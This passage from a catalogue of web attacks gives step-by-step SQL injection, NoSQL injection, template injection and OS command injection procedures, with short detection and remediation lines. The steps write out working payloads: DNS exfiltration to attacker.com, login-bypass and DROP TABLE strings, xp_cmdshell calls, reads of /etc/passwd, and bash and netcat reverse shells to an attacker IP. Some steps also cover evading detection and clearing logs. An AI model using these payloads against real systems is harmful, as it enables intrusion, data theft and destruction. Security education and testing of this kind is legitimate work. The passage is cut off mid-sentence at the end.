- **Scenario**: Attacker injects SQL that causes the DB server to perform external DNS lookups, leaking data to attacker-controlled server.
- **Attack Steps**: Step 1: Identify SQL injection point where normal injection fails or blind injection too slow. Step 2: Use payloads that cause database to resolve a DNS request to your server with data embedded, e.g., '; EXEC xp_dirtree '\\attacker.com\data'-- (MSSQL) or LOAD_FILE('\\\\attacker.com\\'+(SELECT database())) (MySQL). Step 3: Setup a DNS server or use services like Interact.sh to receive DNS queries and capture data. Step 4: Send injection payloads to trigger external DNS lookups from the DB server to your domain. Step 5: Each DNS request’s subdomain encodes extracted data (e.g., database name, user, table names). Step 6: Monitor your DNS logs for requests from the target, decode data from queries. Step 7: Repeat to extract sensitive info without direct interaction or page response. Step 8: This bypasses firewalls that block direct outbound HTTP but allow DNS. Step 9: Use sqlmap with --technique=O for OOB SQLi automated extraction. Step 10: Requires some network setup but is powerful against hardened targets.
- **Detection**: Monitor outbound DNS traffic; alert on suspicious DNS queries from DB servers
- **Solution**: Restrict DB network access; disable external DNS calls; whitelist allowed hosts
- **Tags**: SQLi, OOB, DNS Exfiltration

## Second-Order SQL Injection with Stored Payloads

- **Attack Type**: SQL Injection - Second Order
- **Target**: Websites storing user input
- **Vulnerability**: Stored unsanitized SQL usage
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Privilege escalation, data breach
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: User inputs stored safely but later used unsanitized in SQL query, triggering injection on second use.
- **Attack Steps**: Step 1: Register or input a value (e.g., username) containing SQL injection payload like ' OR 1=1--. Step 2: The application stores this input safely in the database without immediate harm (e.g., in user profile). Step 3: Later, the stored input is used unsanitized in another SQL query (e.g., admin panel searches usernames). Step 4: When the stored payload is executed in this second query, it changes SQL logic, e.g., bypassing admin checks. Step 5: Attacker exploits this by inputting payloads that do no harm on input but trigger injection later. Step 6: Use Burp Suite to capture and modify requests to include payloads in stored fields. Step 7: Monitor application behavior on second use of data (like user list or reports). Step 8: Confirm by seeing unexpected data returned or privilege escalated. Step 9: Automate detection with sqlmap by targeting stored fields if applicable. Step 10: Practice careful payload crafting and multiple testing steps as this attack is more subtle than classic injection.
- **Detection**: Monitor logs for suspicious queries involving stored inputs
- **Solution**: Use input validation AND parameterized queries on all DB interactions, including stored data
- **Tags**: SQLi, Second Order, Stored Payloads

## Authentication Bypass using SQLi in Login Forms

- **Attack Type**: SQL Injection - Authentication Bypass
- **Target**: Login forms on websites
- **Vulnerability**: Unsanitized user inputs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Unauthorized access, account takeover
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker inputs crafted SQL to bypass login authentication and access accounts without valid credentials.
- **Attack Steps**: Step 1: Navigate to the login page with username and password fields. Step 2: In the username or password field, input classic injection payloads like ' OR '1'='1' -- or ' OR 1=1--. Step 3: Submit the login form. Step 4: If vulnerable, the SQL query will become always true, bypassing password check and logging attacker in as first or admin user. Step 5: Try different variations if simple payload fails (e.g., using comments --, #, or multi-line comments /* ... */). Step 6: Use Burp Suite to intercept and modify login requests to automate injections. Step 7: Try to enumerate users by injecting ' UNION SELECT username, password FROM users--. Step 8: Once bypassed, access restricted areas or user data. Step 9: Log out and try again with other payloads for persistent access. Step 10: Test multiple login forms (admin, user, API) for this vulnerability.
- **Detection**: Login failure alerts; monitor multiple failed attempts
- **Solution**: Use prepared statements, stored procedures, and enforce strong input sanitation
- **Tags**: SQLi, Auth Bypass, Login Forms

## Union-Based SQL Injection for Data Extraction

- **Attack Type**: SQL Injection - Union Based
- **Target**: Websites with DB-driven content
- **Vulnerability**: Unsanitized user inputs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data theft, info disclosure
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker uses UNION operator to combine results from injected query with original query to extract data.
- **Attack Steps**: Step 1: Identify injectable parameter, e.g., search input or URL query parameter. Step 2: Test with ' UNION SELECT NULL-- or ' UNION SELECT 1,2,3-- to find number of columns required to avoid errors. Step 3: Once number of columns known, craft payload like ' UNION SELECT username, password, NULL FROM users-- to extract data. Step 4: Observe the web page displaying results merged from the injected query (e.g., user list, passwords). Step 5: Try different column combinations and data types (strings, numbers) to avoid errors. Step 6: Use UNION SELECT to extract sensitive tables or DB metadata (information_schema.tables). Step 7: Automate extraction with sqlmap for efficiency. Step 8: Extract hashes or sensitive info for offline cracking. Step 9: Test on multiple endpoints or parameters. Step 10: Use the obtained info for further attacks like privilege escalation or data exfiltration.
- **Detection**: Monitor DB logs for UNION queries; WAF detection of UNION keywords
- **Solution**: Use parameterized queries; disallow UNION operators in user input
- **Tags**: SQLi, Union Based, Data Extraction

## Stacked Queries SQL Injection (Multiple Queries Execution)

- **Attack Type**: SQL Injection - Stacked Queries
- **Target**: Websites using vulnerable DB
- **Vulnerability**: Unsanitized input, DB allows stacked queries
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data destruction, privilege escalation
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker injects multiple SQL statements separated by semicolons to perform additional queries, e.g., data deletion.
- **Attack Steps**: Step 1: Find injectable parameter where multiple queries might be accepted (some DBs allow stacked queries). Step 2: Test with payload like '; DROP TABLE users;-- or ' ; UPDATE users SET role='admin' WHERE username='attacker';--. Step 3: Submit request and check for changes (data deleted, roles escalated). Step 4: Use Burp Suite to intercept and modify queries for precise injection. Step 5: Try benign payload first to confirm no error. Step 6: If vulnerability confirmed, run destructive or privilege escalation queries. Step 7: Chain multiple queries in one request to perform complex attacks, e.g., insert backdoor user. Step 8: Automate with sqlmap using --sql-shell for interactive shell on DB. Step 9: Monitor application and DB for unexpected query executions. Step 10: Use this technique to escalate attacks beyond data extraction to manipulation or destruction.
- **Detection**: DB transaction logs; monitor for unexpected multiple statements
- **Solution**: Disable stacked queries; use parameterized queries; least privilege DB users
- **Tags**: SQLi, Stacked Queries, Data Manipulation

## Inline Query Injection via Comments and Whitespaces

- **Attack Type**: SQL Injection - Inline Query Manipulation
- **Target**: Websites with input fields
- **Vulnerability**: Unsanitized user inputs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Authentication bypass, data theft
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker uses SQL comments (--, #, /* */) and whitespace tricks to bypass filters or modify logic.
- **Attack Steps**: Step 1: Identify input field vulnerable to SQL injection (login, search, etc.). Step 2: Try injecting payloads with comments and whitespace, e.g., admin'--, admin'#, or admin'/*comment*/ to terminate or modify queries. Step 3: Use whitespaces or newlines to bypass naive input filters, e.g., admin' --  or admin'/**/OR/**/1=1. Step 4: Observe application behavior or error messages to confirm injection. Step 5: Combine comments with payloads like ' OR 1=1-- to bypass authentication or manipulate query logic. Step 6: Use Burp Suite to automate and modify requests with these payloads. Step 7: Repeat on multiple parameters to find all injection points. Step 8: Test with union selects and other SQL commands combined with comments to extract data. Step 9: Use sqlmap to automate attacks with comment payloads. Step 10: Practice careful crafting to avoid detection and bypass WAFs.
- **Detection**: Monitor for suspicious use of comments in queries
- **Solution**: Use strict input validation, parameterized queries, and sanitize inputs
- **Tags**: SQLi, Inline Injection, Comments

## SQL Injection via XML or JSON Query Payloads

- **Attack Type**: SQL Injection - XML/JSON Injection
- **Target**: APIs with XML/JSON inputs
- **Vulnerability**: Unsanitized XML/JSON parsing
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data exfiltration, auth bypass
- **Tools**: Postman, Burp Suite, sqlmap
- **Scenario**: Injection payloads inserted inside XML or JSON sent to backend APIs that are parsed unsafely in SQL queries.
- **Attack Steps**: Step 1: Identify API endpoints accepting XML or JSON payloads (e.g., REST, SOAP). Step 2: Locate parameters inside XML or JSON fields used to build SQL queries (e.g., <username>, "user": "value"). Step 3: Inject classic SQLi payloads inside these fields, e.g., ' OR 1=1--. Step 4: Monitor responses for changes indicating injection success (e.g., bypassed authentication, data leak). Step 5: Use Burp Suite to intercept and modify XML/JSON requests dynamically. Step 6: Test both GET and POST API calls. Step 7: Automate with sqlmap using --method=POST and --data containing crafted XML/JSON. Step 8: Try blind SQLi techniques if no error messages shown. Step 9: Check if backend directly interpolates XML/JSON fields into SQL without sanitization. Step 10: Use findings to extract data or escalate privileges.
- **Detection**: Monitor logs for malformed XML/JSON payloads
- **Solution**: Use prepared statements, sanitize XML/JSON input, use strong schema validation
- **Tags**: SQLi, XML Injection, JSON Injection

## SQL Injection through NoSQL Databases (MongoDB Injection)

- **Attack Type**: NoSQL Injection
- **Target**: Applications using NoSQL DBs
- **Vulnerability**: Unsanitized JSON inputs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Auth bypass, data breach
- **Tools**: MongoDB shell, Burp Suite
- **Scenario**: Attacker injects malicious NoSQL queries (e.g., MongoDB) exploiting lack of input validation in JSON queries.
- **Attack Steps**: Step 1: Find application using NoSQL backend (MongoDB, CouchDB) with JSON query inputs. Step 2: Identify inputs where JSON is used to query database (e.g., login forms sending { "username": "user", "password": "pass" }). Step 3: Inject special operators like $ne (not equal), $gt (greater than), e.g., { "username": { "$ne": null }, "password": "any" } to bypass authentication. Step 4: Modify JSON fields to always return true queries, e.g., { "username": "admin", "password": { "$gt": "" } }. Step 5: Observe login bypass or data retrieval without valid credentials. Step 6: Use Burp Suite to craft and send malicious JSON queries. Step 7: Attempt extraction of data via injection in filters or projection queries. Step 8: Test if application uses direct JSON injection in NoSQL commands without sanitization. Step 9: Automate with NoSQLMap or custom scripts. Step 10: Exploit to access unauthorized data or escalate privileges.
- **Detection**: Monitor query logs for unexpected operators
- **Solution**: Use strict input validation, parameterized NoSQL queries, and query whitelisting
- **Tags**: NoSQLi, MongoDB Injection

## Error Message-Based SQLi Exploiting Detailed DB Errors

- **Attack Type**: SQL Injection - Error Message Based
- **Target**: Websites with verbose error reporting
- **Vulnerability**: Unsanitized inputs causing errors
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data leakage, info disclosure
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Exploit detailed database error messages leaking SQL syntax or DB info to craft attacks.
- **Attack Steps**: Step 1: Enter single quote ' or invalid input to induce DB error. Step 2: Observe detailed error messages (e.g., "syntax error at line X", "unknown column", "duplicate entry"). Step 3: Use error info to learn DB type, table/column names, or SQL syntax specifics. Step 4: Inject crafted payloads like ' UNION SELECT NULL, version()-- or ' AND 1=0 UNION SELECT username, password-- using info gained. Step 5: Use error messages to iteratively refine payloads for extracting data. Step 6: Automate with sqlmap to dump DB using error-based techniques. Step 7: Test multiple inputs and HTTP methods for vulnerability. Step 8: Use comments and whitespaces to bypass filters if needed. Step 9: Observe app response carefully to detect subtle differences. Step 10: Use error feedback to escalate attack precision and extract full DB schema and contents.
- **Detection**: Monitor logs for frequent DB errors and unusual queries
- **Solution**: Disable detailed error messages, use generic error pages, sanitize inputs
- **Tags**: SQLi, Error-Based, Info Disclosure

## Boolean-Based SQLi with Conditional Responses

- **Attack Type**: SQL Injection - Blind Boolean-Based
- **Target**: Websites with injectable inputs
- **Vulnerability**: Unsanitized inputs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data theft, privilege escalation
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker injects conditions in input to observe true/false responses, inferring data bit by bit.
- **Attack Steps**: Step 1: Identify injectable input field (search, login, etc.). Step 2: Inject boolean condition payload like ' AND 1=1 -- and note normal response. Step 3: Inject false condition payload ' AND 1=2 -- and note different response or error. Step 4: Use true/false responses to infer data, e.g., ' AND (SELECT SUBSTRING(password,1,1))='a' -- to check first letter of password. Step 5: Repeat with different characters and positions to extract data one bit at a time. Step 6: Automate this tedious process with sqlmap’s boolean-based injection techniques. Step 7: Monitor app responses carefully for small differences (content length, error, redirects). Step 8: Test multiple parameters and HTTP methods. Step 9: Use timing-based blind SQLi if no visible differences occur. Step 10: Use gathered data for further exploitation or access.
- **Detection**: Monitor traffic for injection patterns
- **Solution**: Use parameterized queries, sanitize inputs, limit error info
- **Tags**: SQLi, Blind SQLi, Boolean-Based

## SQL Injection Leading to Remote Code Execution via DB Functions

- **Attack Type**: SQL Injection - RCE via DB Functions
- **Target**: Web apps with DB backend
- **Vulnerability**: Unsanitized input + enabled DB functions
- **MITRE**: T1059 – Command Execution
- **Impact**: Full system compromise
- **Tools**: sqlmap, Metasploit, Burp Suite
- **Scenario**: Attacker uses SQL functions like xp_cmdshell (MSSQL) or LOAD_FILE (MySQL) to execute OS commands remotely.
- **Attack Steps**: Step 1: Identify injectable parameter vulnerable to SQLi. Step 2: Test for ability to execute functions like xp_cmdshell, system(), or LOAD_FILE. Step 3: Inject payloads such as '; EXEC xp_cmdshell('whoami');-- (MSSQL) or ' UNION SELECT LOAD_FILE('/etc/passwd')-- (MySQL) to check execution. Step 4: Observe application response or output to confirm command execution. Step 5: Upload a web shell or reverse shell payload via SQL functions if possible. Step 6: Use tools like sqlmap with --os-shell or Metasploit modules to automate RCE. Step 7: Test different database-specific functions for command execution. Step 8: Once access obtained, escalate privileges or pivot inside network. Step 9: Maintain persistence by creating DB jobs or backdoor accounts. Step 10: Clean logs to avoid detection or cover tracks.
- **Detection**: Monitor execution logs, unexpected commands
- **Solution**: Disable dangerous DB functions, restrict DB permissions
- **Tags**: SQLi, RCE, DB Function Exploit

## SQL Injection via HTTP Headers (User-Agent, Referer)

- **Attack Type**: SQL Injection - Injection in Headers
- **Target**: Websites processing headers
- **Vulnerability**: Unsanitized use of headers in SQL
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data leakage, unauthorized access
- **Tools**: Burp Suite, Browser, sqlmap
- **Scenario**: Attacker injects malicious SQL in HTTP headers which are logged or used unsafely in backend SQL queries.
- **Attack Steps**: Step 1: Identify web app that logs or uses HTTP headers (User-Agent, Referer) in SQL queries. Step 2: Modify HTTP headers to include SQL payloads, e.g., User-Agent: ' OR 1=1--. Step 3: Send request with malicious headers using Burp Suite or curl. Step 4: Monitor response or app behavior to confirm injection (bypass login, error messages). Step 5: Inject payloads targeting specific queries using comments and whitespaces. Step 6: Repeat for other headers (Referer, X-Forwarded-For, Cookie). Step 7: Use automated tools like sqlmap with custom header injection. Step 8: Exploit successful injections to extract data or escalate privileges. Step 9: Chain with other attacks like session hijacking or remote code execution. Step 10: Ensure testing is performed in legal and controlled environments.
- **Detection**: Monitor logs for suspicious headers or queries
- **Solution**: Sanitize and validate all header inputs before use in SQL queries
- **Tags**: SQLi, Header Injection

## SQL Injection via URL Path Parameters

- **Attack Type**: SQL Injection - URL Path Injection
- **Target**: Websites with RESTful URLs
- **Vulnerability**: Unsanitized URL path parameters
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data theft, auth bypass
- **Tools**: Browser, Burp Suite, sqlmap
- **Scenario**: Attacker injects SQL payloads in URL path segments that are used unsafely in SQL queries.
- **Attack Steps**: Step 1: Identify URLs where parameters appear in the path, e.g., /products/123. Step 2: Try injecting SQL payloads in place of parameter, e.g., /products/123' OR '1'='1. Step 3: Observe app response or error messages indicating injection. Step 4: Use comments and whitespace to bypass filters, e.g., /products/123'--. Step 5: Inject UNION SELECT payloads to extract data via URL. Step 6: Test for blind SQLi with boolean or time-based payloads in path. Step 7: Use Burp Suite to intercept and manipulate path parameters for injection. Step 8: Automate testing with sqlmap specifying injection in URL path. Step 9: Exploit vulnerability to bypass auth, extract data, or escalate privileges. Step 10: Perform thorough scanning of all URL paths for injection points.
- **Detection**: Monitor web logs for suspicious URL patterns
- **Solution**: Use strict validation and parameterization of all URL path inputs
- **Tags**: SQLi, URL Path Injection

## SQL Injection in Stored Procedures and Functions

- **Attack Type**: SQL Injection via Stored Procedures
- **Target**: Databases with stored procs
- **Vulnerability**: Unsanitized input to stored procs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data theft, auth bypass, escalation
- **Tools**: sqlmap, Burp Suite
- **Scenario**: Attackers exploit unsafe concatenation or parameter handling inside database stored procedures or functions.
- **Attack Steps**: Step 1: Identify database using stored procedures or functions to process input parameters. Step 2: Find application inputs that trigger execution of these stored procedures/functions (e.g., form submissions, API calls). Step 3: Inject malicious SQL payloads into inputs passed to stored procedures, such as ' OR 1=1--. Step 4: Observe application behavior or errors indicating injection success. Step 5: Test stored procedure parameters for unsafe concatenation leading to SQLi. Step 6: Use sqlmap with custom injection points if possible to automate testing. Step 7: Exploit injection to manipulate logic, extract data, bypass auth, or escalate privileges. Step 8: Check for privilege escalation by injecting into functions that run with higher DB privileges. Step 9: Try to execute OS commands if stored procs allow it (e.g., via extended procedures). Step 10: Document findings and recommend parameterized calls or input sanitization inside stored procedures.
- **Detection**: Monitor stored proc calls and errors
- **Solution**: Use parameterized queries inside procs, sanitize inputs, avoid dynamic SQL in procs
- **Tags**: SQLi, Stored Procedures

## SQL Injection via File Upload Names Used in Queries

- **Attack Type**: SQL Injection via File Upload Names
- **Target**: Apps with file uploads
- **Vulnerability**: Unsanitized file names in queries
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data corruption, privilege escalation
- **Tools**: Burp Suite, Browser
- **Scenario**: Attackers upload files with malicious filenames which are used unsafely in SQL queries causing injection.
- **Attack Steps**: Step 1: Identify upload forms accepting file names stored in database. Step 2: Upload file with crafted filename containing SQL injection payload, e.g., shell'; DROP TABLE users;--.jpg. Step 3: Observe app behavior and error messages. Step 4: Check if filename is used directly in SQL queries without sanitization. Step 5: Test if injection in filename can alter queries (SELECT, INSERT, UPDATE). Step 6: Use Burp Suite to repeat uploads with different payloads to confirm injection. Step 7: Try to extract data, drop tables, or escalate access by injecting via filename. Step 8: Test filename injection combined with other inputs for multi-vector attack. Step 9: Check if logs or error pages leak query details. Step 10: Recommend strict filename validation, escaping, and use of prepared statements when handling filenames in queries.
- **Detection**: Monitor upload logs and database errors
- **Solution**: Sanitize and escape filenames, use parameterized queries when inserting filenames
- **Tags**: SQLi, File Upload Injection

## SQL Injection via ORMs with Unsafe Query Concatenation

- **Attack Type**: ORM Injection via Unsafe Query Building
- **Target**: Apps using ORMs
- **Vulnerability**: Unsafe concatenation in ORM queries
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data breach, data loss, escalation
- **Tools**: Burp Suite, ORM debug tools
- **Scenario**: Attackers exploit dynamic query building in ORMs where user input is concatenated into raw SQL queries.
- **Attack Steps**: Step 1: Identify app using ORM (e.g., Hibernate, Sequelize, Django ORM). Step 2: Find inputs passed to ORM methods that build queries via string concatenation instead of parameter binding. Step 3: Inject SQL payloads in these inputs, e.g., '; DROP TABLE users;--. Step 4: Monitor app responses or errors indicating injection. Step 5: Use debugging tools or logs to analyze ORM queries generated. Step 6: Test if injection leads to authentication bypass, data extraction, or privilege escalation. Step 7: Repeat for all user inputs interacting with database via ORM. Step 8: Automate tests with sqlmap or custom scripts targeting ORM injection. Step 9: Educate developers to avoid raw query concatenation; use ORM parameterization properly. Step 10: Fix vulnerabilities by refactoring queries to use ORM safe parameter binding features.
- **Detection**: Monitor ORM query logs for anomalies
- **Solution**: Enforce safe parameter binding in ORM usage, sanitize inputs
- **Tags**: SQLi, ORM Injection

## SQL Injection via Injection in Database Triggers or Jobs

- **Attack Type**: SQL Injection in DB Triggers/Jobs
- **Target**: Databases with triggers/jobs
- **Vulnerability**: Unsafe dynamic SQL in triggers/jobs
- **MITRE**: T1190 – Exploit Public-Facing Application
- **Impact**: Data loss, escalation, RCE
- **Tools**: sqlmap, DB admin tools
- **Scenario**: Attackers inject malicious SQL via inputs that trigger unsafe dynamic SQL inside database triggers or scheduled jobs.
- **Attack Steps**: Step 1: Identify triggers or scheduled jobs in DB that use dynamic SQL or concatenate input. Step 2: Find application inputs that affect data causing trigger/job execution. Step 3: Inject SQL payloads into these inputs. Step 4: Observe errors or unexpected behavior indicating trigger/job injection. Step 5: Attempt to escalate privileges or execute commands via injection inside triggers/jobs. Step 6: Use DB admin tools to monitor trigger/job activity logs for anomalies. Step 7: Exploit triggers to perform data corruption, unauthorized access, or command execution. Step 8: Test if trigger/job execution context has elevated DB privileges. Step 9: Try chaining injections with other SQLi for full compromise. Step 10: Recommend sanitizing inputs affecting triggers/jobs and avoid dynamic SQL in DB code.
- **Detection**: Audit triggers/jobs, monitor DB logs for suspicious activity
- **Solution**: Rewrite triggers/jobs with parameterized queries, sanitize inputs, restrict privileges
- **Tags**: SQLi, Trigger Injection

## Blind Command Injection with Timing Side-Channels

- **Attack Type**: Blind OS Command Injection
- **Target**: Web apps, APIs
- **Vulnerability**: Blind injection with no output
- **MITRE**: T1059 – Command Execution
- **Impact**: Data leakage, full compromise
- **Tools**: curl, Burp Suite
- **Scenario**: Injection without direct output; attacker infers success via delays using commands like sleep.
- **Attack Steps**: Step 1: Identify injectable input used in shell commands with no visible output. Step 2: Inject timing-based payloads like ; sleep 5 or && ping -c 5 127.0.0.1 to cause delay. Step 3: Send two requests: one normal, one with delay payload; compare response times. Step 4: If delayed response occurs, confirm command injection vulnerability. Step 5: Inject more commands with conditional delays to extract data bit-by-bit, e.g., ; if [ condition ]; then sleep 5; fi. Step 6: Automate timing attacks using tools like Burp Suite Intruder or custom scripts. Step 7: Use this technique when no direct command output is returned. Step 8: Continue with privilege escalation or internal network scanning via command injection. Step 9: Keep requests low and stealthy to avoid detection. Step 10: Report and recommend fixing input validation and safe command handling.
- **Detection**: Monitor response times and unexpected delays
- **Solution**: Sanitize inputs, implement output encoding, use safe APIs
- **Tags**: Blind Command Injection

## Command Injection via HTTP Headers

- **Attack Type**: Command Injection in Headers
- **Target**: Web servers, logging apps
- **Vulnerability**: Unsanitized use of headers in shell
- **MITRE**: T1059 – Command Execution
- **Impact**: System compromise, info leakage
- **Tools**: Burp Suite, curl
- **Scenario**: Attackers inject OS commands in HTTP headers (User-Agent, Referer) that are used unsafely in shell calls.
- **Attack Steps**: Step 1: Identify web app that logs or processes HTTP headers in shell commands (e.g., logs rotated via shell scripts). Step 2: Modify headers like User-Agent or Referer to include payloads such as ; whoami or && id. Step 3: Send requests with malicious headers using Burp Suite or curl. Step 4: Monitor response or server behavior for command execution signs. Step 5: Inject more payloads to escalate privileges or execute reverse shell commands. Step 6: Use Burp Suite Intruder for automating header injections. Step 7: Check logs or error pages for evidence of command output. Step 8: Exploit any unsanitized shell usage of headers (e.g., log rotation, backups). Step 9: Test all headers (Cookie, X-Forwarded-For) for injection vectors. Step 10: Document and recommend sanitizing all header inputs and avoiding shell calls with user-controlled data.
- **Detection**: Monitor logs, watch for suspicious commands or crashes
- **Solution**: Sanitize header inputs, avoid shell execution on user inputs
- **Tags**: Command Injection in Headers

## Command Injection via File Upload Filename Execution

- **Attack Type**: Command Injection via Filename
- **Target**: Web apps with uploads
- **Vulnerability**: Unsanitized use of filenames in shell
- **MITRE**: T1059 – Command Execution
- **Impact**: System takeover, persistence
- **Tools**: Burp Suite, Browser
- **Scenario**: Attackers upload files with malicious filenames that get used in shell commands causing injection.
- **Attack Steps**: Step 1: Identify file upload forms saving or processing files with shell commands (e.g., antivirus scanning). Step 2: Upload file with filename containing payload like shell; whoami.jpg or test && id.php. Step 3: Check if server processes filename unsafely in shell commands. Step 4: Observe server response or behavior indicating command execution. Step 5: Upload various payloads with separators (;, &&) to test injection. Step 6: If successful, try commands to escalate access or create reverse shells. Step 7: Use Burp Suite to automate uploads with different malicious filenames. Step 8: Inspect logs and server behavior for confirmation. Step 9: Test if filename is logged, scanned, or passed directly to shell scripts. Step 10: Recommend validating and sanitizing filenames, avoid shell commands on user input, and implement safe upload processing.
- **Detection**: Monitor upload logs and shell command usage
- **Solution**: Sanitize filenames, avoid shell calls, restrict upload handling
- **Tags**: File Upload Command Injection

## Command Injection through Template Engines (e.g., eval())

- **Attack Type**: Command Injection via Template
- **Target**: Web apps with template engine
- **Vulnerability**: Unsafe eval/code execution in templates
- **MITRE**: T1059 – Command Execution
- **Impact**: Full system compromise
- **Tools**: Burp Suite, Template tools
- **Scenario**: Attackers inject malicious code in template variables that get executed unsafely via template engine eval.
- **Attack Steps**: Step 1: Identify web app using template engines that support code execution, e.g., Jinja2, Twig, ERB. Step 2: Find user inputs that get rendered inside templates without proper sanitization. Step 3: Inject payloads in inputs like {{ 7*7 }}, then escalate to OS commands, e.g., {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}. Step 4: Observe rendered output or error messages confirming execution. Step 5: Try payloads that execute system commands (e.g., ls, whoami, cat /etc/passwd). Step 6: Use Burp Suite to automate injection attempts in different input fields. Step 7: If successful, upload webshells or establish reverse shells via command execution. Step 8: Exploit this for data theft, privilege escalation, or persistence. Step 9: Review all template variables and inputs for unsafe rendering. Step 10: Report and recommend disabling eval-like features, escaping inputs, and using safe templating practices.
- **Detection**: Monitor logs for suspicious template inputs or output
- **Solution**: Use safe template engines; escape user input; disable code execution in templates
- **Tags**: SSTI, Command Injection

## Command Injection via Environment Variables Controlled by User

- **Attack Type**: Env Var Injection
- **Target**: Web servers, containers
- **Vulnerability**: Unsanitized env vars in shell commands
- **MITRE**: T1059 – Command Execution
- **Impact**: Remote code execution possible
- **Tools**: Burp Suite, OS tools
- **Scenario**: User-controlled environment variables are used in system calls without sanitization causing injection.
- **Attack Steps**: Step 1: Identify environment variables (e.g., HTTP headers, app configs) controllable by user input. Step 2: Check if these variables are used in shell commands or system calls by the app. Step 3: Inject payloads into environment variables, e.g., "; whoami; " or $(id). Step 4: Trigger functionality that executes shell commands using these variables. Step 5: Observe output or server behavior for command execution. Step 6: Try escalating commands to read sensitive files or escalate privileges. Step 7: Use Burp Suite or curl to automate setting environment variables (e.g., via headers). Step 8: Confirm vulnerability by injecting payloads causing command output or delays. Step 9: Document findings, focusing on injection through environment variables. Step 10: Recommend sanitizing environment variables before use and avoid direct shell calls with user-controlled env data.
- **Detection**: Monitor shell calls and environment variable usage
- **Solution**: Validate/sanitize env vars; avoid passing user-controlled env data to shell
- **Tags**: OS Command Injection

## Command Injection via Unsafe System Calls in Serverless Functions

- **Attack Type**: Command Injection in Serverless
- **Target**: Serverless Functions
- **Vulnerability**: Unsafe system calls with user input
- **MITRE**: T1059 – Command Execution
- **Impact**: Data breach, service disruption
- **Tools**: AWS CLI, Azure Portal, curl
- **Scenario**: Serverless functions execute system commands unsafely using user input, leading to injection.
- **Attack Steps**: Step 1: Identify serverless function (AWS Lambda, Azure Functions) that runs system commands with user input. Step 2: Find inputs triggering these commands via API Gateway or event triggers. Step 3: Inject command separators and payloads, e.g., ; ls, && whoami. Step 4: Observe logs, responses, or side effects showing command execution. Step 5: Try blind injection with timing payloads if output is not visible. Step 6: Attempt privilege escalation or data exfiltration by reading environment or file system. Step 7: Use cloud console or Burp Suite to automate attacks. Step 8: Test all input vectors including event payloads. Step 9: Monitor for suspicious commands or function crashes. Step 10: Report and recommend avoiding shell calls in serverless functions, using safe libraries, and sanitizing inputs.
- **Detection**: Cloud logs monitoring, anomaly detection in function behavior
- **Solution**: Use managed SDK functions instead of shell calls; sanitize all inputs
- **Tags**: Serverless Command Injection

## Command Injection via Path Traversal to Execute Scripts

- **Attack Type**: Command Injection via Path Traversal
- **Target**: Web apps, file servers
- **Vulnerability**: Unsanitized file path inputs leading to script execution
- **MITRE**: T1203 – Exploitation for Privilege Escalation
- **Impact**: Remote code execution, full compromise
- **Tools**: Burp Suite, curl, File managers
- **Scenario**: Attackers use path traversal to upload or access scripts executed by the server.
- **Attack Steps**: Step 1: Identify upload or file include features vulnerable to path traversal (e.g., ../../). Step 2: Upload malicious scripts or place existing scripts in accessible locations. Step 3: Use path traversal in file path parameters to execute these scripts (e.g., /run?file=../../uploads/shell.php). Step 4: Observe command execution or output. Step 5: Inject commands via query strings or file content. Step 6: Use Burp Suite to automate path traversal payloads. Step 7: Test different traversal encodings (URL encode, double encode). Step 8: If successful, establish reverse shells or escalate privileges via script execution. Step 9: Document attack and recommend restricting file access and validating paths. Step 10: Recommend disabling execution in upload directories and using allowlists for file paths.
- **Detection**: Monitor file access patterns and errors
- **Solution**: Validate file paths strictly, disable execution in upload directories, use allowlist
- **Tags**: Path Traversal, Command Injection

## OS Command Injection via Unsanitized Input in Shell Calls

- **Attack Type**: OS Command Injection via Web Input
- **Target**: Web Servers, APIs
- **Vulnerability**: Unsanitized user input passed to system shell
- **MITRE**: T1203 – Exploitation for Client Execution
- **Impact**: Remote Code Execution (RCE), Privilege Escalation
- **Tools**: Burp Suite, curl, Netcat (nc), browser
- **Scenario**: Attackers inject operating system (OS) commands into web input fields that are directly passed to shell commands without proper sanitization, leading to command execution.
- **Attack Steps**: Step 1: Identify a target website or web application with an input field that interacts with the system backend. Look for features like ping utilities, file uploads, image converters, or any input that might invoke a shell command. For example, a “Check Host Status” tool might internally call ping. Step 2: Interact with the field using a normal input to confirm it triggers a shell call (e.g., inputting 127.0.0.1 to a ping tool should return ping results). Step 3: Start testing for command injection. A basic test input would be 127.0.0.1; whoami or 127.0.0.1 && whoami. The semicolon (;) or double ampersand (&&) allows chaining shell commands. Step 4: Observe the application’s response. If the output includes the result of whoami (like www-data, root, etc.), it confirms command execution is happening through unsanitized shell calls. Step 5: Try more commands like ls, uname -a, id to further confirm execution environment. Step 6: For deeper testing, set up a reverse shell. On your machine, run a Netcat listener: nc -lvp 4444. Then in the web input, inject: 127.0.0.1; bash -i >& /dev/tcp/YOUR-IP/4444 0>&1 or 127.0.0.1; nc YOUR-IP 4444 -e /bin/bash. Replace YOUR-IP with your public IP address. Step 7: Once the command is executed, check your terminal where Netcat is listening. If the reverse shell is successful, you’ll get a shell prompt ($) and can interact with the target server remotely. Step 8: Explore the system: ls /, cat /etc/passwd, pwd, etc. Be cautious. Never use this on unauthorized systems. Step 9: To clean up, close your listener, document the vulnerability responsibly, and report it to the affected organization or use it in a 